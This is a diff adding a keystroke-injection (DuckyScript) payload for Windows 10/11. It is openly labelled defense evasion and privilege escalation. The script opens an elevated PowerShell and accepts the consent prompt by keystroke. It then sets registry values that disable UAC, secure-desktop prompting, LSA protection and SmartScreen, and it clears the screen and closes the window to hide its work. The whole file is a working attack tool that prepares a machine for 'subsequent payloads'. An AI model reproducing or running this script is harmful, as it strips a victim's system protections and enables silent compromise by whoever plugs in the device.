@@ -1,0 +1,62 @@
+REM ==========================================
+REM Title: Disable User Account Control
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Disables UAC (User Account
+REM   Control) via registry modifications and
+REM   group policy. Lowers the system security
+REM   posture to allow silent privilege
+REM   escalation for subsequent payloads.
+REM Category: Defense Evasion / Privilege Escalation
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Disable UAC via registry (primary method)
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -Force
+ENTER
+DELAY 400
+REM Set consent prompt behavior to elevate without prompting
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force
+ENTER
+DELAY 400
+REM Disable secure desktop for UAC prompts
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0 -Force
+ENTER
+DELAY 400
+REM Disable UAC for built-in administrator
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 0 -Force
+ENTER
+DELAY 400
+REM Also disable via ConsentPromptBehaviorUser
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0 -Force
+ENTER
+DELAY 400
+REM Disable Local Security Authority protection
+STRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'RunAsPPL' -Value 0 -Force 2>$null
+ENTER
+DELAY 400
+REM Disable Windows SmartScreen
+STRING Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Force
+ENTER
+DELAY 400
+REM Verify changes
+STRING $uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
+ENTER
+DELAY 350
+STRING Write-Host "EnableLUA: $($uac.EnableLUA) | ConsentPrompt: $($uac.ConsentPromptBehaviorAdmin)"
+ENTER
+DELAY 400
+REM Note: Full UAC disable requires a reboot
+STRING Write-Host "UAC disabled. Reboot required for full effect."
+ENTER
+DELAY 400
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
